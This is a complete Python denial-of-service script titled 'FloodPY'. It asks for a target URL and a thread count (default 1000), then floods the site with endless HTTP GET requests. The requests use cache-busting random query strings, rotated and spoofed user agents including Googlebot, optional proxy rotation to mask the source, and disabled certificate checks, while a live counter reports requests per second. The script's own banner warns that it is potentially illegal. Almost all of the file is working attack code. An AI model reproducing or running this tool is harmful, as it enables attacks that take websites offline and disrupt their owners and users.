import concurrent.futures
import random
import threading
import requests
import sys
import os
import platform
import time
import colorama

if platform.system() == "Windows":
    colorama.init()
    from colorama import Fore, Style
    GREEN = Fore.GREEN
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    CYAN = Fore.CYAN
    MAGENTA = Fore.MAGENTA
    RESET = Style.RESET_ALL
else:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    RESET = "\033[0m"

os.system('cls' if os.name == 'nt' else 'clear')

banner = fr"""{CYAN}
___________.__                    .__________________.___.
\_   _____/|  |   ____   ____   __| _/\______   \__  |   |
 |    __)  |  |  /  _ \ /  _ \ / __ |  |     ___//   |   |
 |     \   |  |_(  <_> |  <_> ) /_/ |  |    |    \____   |
 \___  /   |____/\____/ \____/\____ |  |____|    / ______|
     \/                            \/            \/       
{RESET}"""
print(banner)

DEFAULT_THREADS = 1000

while True:
    try:
        num_threads_str = input(f"{CYAN}Enter number of threads (High for flood, Default: {DEFAULT_THREADS}) > {RESET}")
        if not num_threads_str:
            num_threads = DEFAULT_THREADS
            break
        num_threads = int(num_threads_str)
        if num_threads > 0:
            break
        else:
            print(f"{RED}Number must be greater than 0.{RESET}")
    except ValueError:
        print(f"{RED}Invalid integer.{RESET}")

while True:
    url = input(f"{CYAN}Enter target URL (e.g., https://example.com) > {RESET}")
    if url.startswith("http://") or url.startswith("https://"):
        break
    else:
        print(f"{RED}Invalid URL. Must start with http:// or https://{RESET}")

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
    "FloodAgent/2.0 (Aggressive; Concurrent; +https://github.com/)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0"
]
referers = ["https://google.com/", "https://bing.com/", "https://duckduckgo.com/", url]
use_proxies_input = input(f"{CYAN}Use proxies? (y/n) > {RESET}").lower()
use_proxies = use_proxies_input == 'y'
proxies_list = []

if use_proxies:
    proxy_file = "proxies.txt"
    try:
        with open(proxy_file, 'r') as f:
            proxies_list = [line.strip() for line in f if line.strip()]
        if not proxies_list:
            print(f"{YELLOW}[!] No valid proxies found in {proxy_file}. Continue without proxies? (y/n){RESET}")
            if input(f"{CYAN}> {RESET}").lower() != 'y': sys.exit()
            use_proxies = False
        else:
            print(f"{GREEN}[+] {len(proxies_list)} proxies loaded.{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] {proxy_file} not found. Continue without proxies? (y/n){RESET}")
        if input(f"{CYAN}> {RESET}").lower() != 'y': sys.exit()
        use_proxies = False
    except Exception as e:
         print(f"{RED}[!] Error reading proxy file: {e}{RESET}")
         sys.exit()

requests_sent = 0
errors_count = 0
start_time = time.monotonic()
counter_lock = threading.Lock()

def flood():
    global requests_sent
    global errors_count
    session = requests.Session()
    session.headers.update({
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "User-Agent": random.choice(user_agents)
    })
    while True:
        proxy = None
        proxy_dict = None
        if use_proxies and proxies_list:
            proxy = random.choice(proxies_list)
            proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        local_headers = {
            "User-Agent": random.choice(user_agents),
            "Referer": random.choice(referers)
        }
        target_url = f"{url}?{random.randint(1, 99999999)}={random.randint(1, 99999999)}"
        try:
            response = session.get(target_url, headers=local_headers, proxies=proxy_dict, timeout=2.5, verify=False, stream=False)
            with counter_lock:
                requests_sent += 1
            status_code = response.status_code
            status_color = GREEN if 200 <= status_code < 300 else YELLOW if 300 <= status_code < 500 else RED
            status_text = f"{status_color}{status_code}{RESET}"
            error_text = ""
        except requests.exceptions.RequestException:
            with counter_lock:
                errors_count += 1
            status_text = f"{RED}ERR{RESET}"
            error_text = f"{RED}NetErr{RESET}"
        except Exception:
            with counter_lock:
                errors_count += 1
            status_text = f"{RED}ERR{RESET}"
            error_text = f"{RED}UnkErr{RESET}"
        with counter_lock:
            elapsed_time = time.monotonic() - start_time
            rps = int(requests_sent / elapsed_time) if elapsed_time > 0 else 0
            sys.stdout.write(
                f"\r{CYAN}Target:{RESET} {url[:30].ljust(30)} | "
                f"{MAGENTA}Threads:{RESET} {num_threads:<4} | "
                f"{GREEN}Sent:{RESET} {requests_sent:<8} | "
                f"{RED}Errors:{RESET} {errors_count:<6} | "
                f"{YELLOW}RPS:{RESET} {rps:<5} | "
                f"{CYAN}Status:{RESET} {status_text:<12} {error_text:<12}"
            )
            sys.stdout.flush()
print(f"\n{MAGENTA}[*] Launching FLOOD on {YELLOW}{url}{MAGENTA} with {CYAN}{num_threads}{MAGENTA} threads...{RESET}")
print(f"{RED}[!] WARNING: This is EXTREMELY AGGRESSIVE and potentially ILLEGAL.{RESET}")
print(f"{YELLOW}[!] Press Ctrl+C to stop.{RESET}")
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
executor = concurrent.futures.ThreadPoolExecutor(max_workers=num_threads)
futures = []
try:
    for _ in range(num_threads):
       futures.append(executor.submit(flood))
    concurrent.futures.wait(futures)
except KeyboardInterrupt:
    print(f"\n\n{YELLOW}[!] Ctrl+C detected. Shutting down threads...{RESET}")
    executor.shutdown(wait=False, cancel_futures=True)
except Exception as e:
    print(f"\n\n{RED}[!] Critical Error: {e}{RESET}")
    executor.shutdown(wait=False, cancel_futures=True)
finally:
    if not executor._shutdown:
       executor.shutdown(wait=False, cancel_futures=True)
    print(f"{MAGENTA}[*] Flood script terminated.{RESET}")
    sys.exit(0)
